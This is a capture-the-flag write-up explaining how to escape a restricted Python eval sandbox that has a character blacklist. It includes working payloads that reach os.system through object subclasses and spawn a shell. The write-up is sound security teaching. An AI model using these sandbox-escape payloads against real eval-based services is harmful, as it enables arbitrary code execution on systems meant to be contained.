# PyMagic

**Proof of Concept**

Given a sophisticated pyjail script with several restrictions.
```py
#!/usr/bin/env python3
import re

class something_to_do_huh:...
eval = eval
code = input('>>> ')

if not re.findall('[()\'"0123456789 ]', code):
    for k in (b:=__builtins__.__dict__).keys():
        b[k] = None
    
    eval(code, {'__builtins__': {}, '_': something_to_do_huh})
```

The first set of restrictions involves deleting `__builtins__`, thereby preventing us from accessing all of the built-in functions through `__builtins__`. By default, it can be easily circumvented by accessing an object subclass that has a `pre-loaded` module. For example, if we want to access `os` module without using `__import__` statement, it can be accomplished by looking for `os._wrap_close`, which is accessible through the `__globals__` attribute.

The second set of restrictions pertains to character blacklists, specifically `()'"0123456789 `, which hinders us from making normal function calls and declaring string variables. It can tricked by overwriting the `something_to_do_huh` magic attribute, specifically `__class_getitem__` introduced since **Python 3.7**, in order to substitute the method/function callback behavior from func(args) to func[args].

In this case, [__class_getitem__](https://peps.python.org/pep-0560/) serves as a `generic type` for a Python class, allowing it to be directly accessed with `class_name[args]` without requiring class instantiation beforehand.

The last restriction isolates the code using `eval(code, {'__builtins__': {}, '_': something_to_do_huh})`, effectively preventing us from accessing default `built-in functions` other than `_`, which points to the `something_to_do_huh` class. It can also be resolved by locating a specific subclass from the object class.

For simplicity, we can assign a new value to `__builtins__` using the `pre-loaded os` module, utilizing the walrus `:=` statement. This allows us to call it directly as a `built-in` function. It's important to remember that these changes only apply within a new frame, so we need to encapsulate them within a `lambda` function.

Here's the generic solution without constraints:
```py
_.__class__.__subclasses__(_.__base__)[140].__init__.__globals__['system']('sh')
```
And here's the modified solution
```py
[x:=_!=_,y:=-~x,z:=_.__name__]+[__builtins__:=_[_.__base__][-~y*~y*~y*~y*~y*~y*~y-~y*~y*~y-~y*-~y].__init__.__globals__	for	_.__class_getitem__	in[_.__class__.__subclasses__]]+[_[z[x]+z[-y]]for	_.__class_getitem__	in[_[_]for	_.__class_getitem__	in[lambda	x:system]]]
```

Alternatively, it's also possible to utilize string concatenation from the `__doc__` and `__name__` attributes for string crafting, such as **system**, **sh**, etc

```py
[x:=_!=_,y:=-~x,z:=_.__name__,d:=[].__doc__]+[_[z[x]+z[-y]]for	_.__class_getitem__	in[_[_.__base__][-~y*~y*~y*~y*~y*~y*~y-~y*~y*~y-~y*-~y].__init__.__globals__[z[x]+d[~-~y*~y*~y*~y*~y*~y-~y*~y*-~y-y]+z[x]+z[~y*~y]+z[~y*~y-y]+z[-~y]]for	_.__class_getitem__	in[_.__class__.__subclasses__]]]
```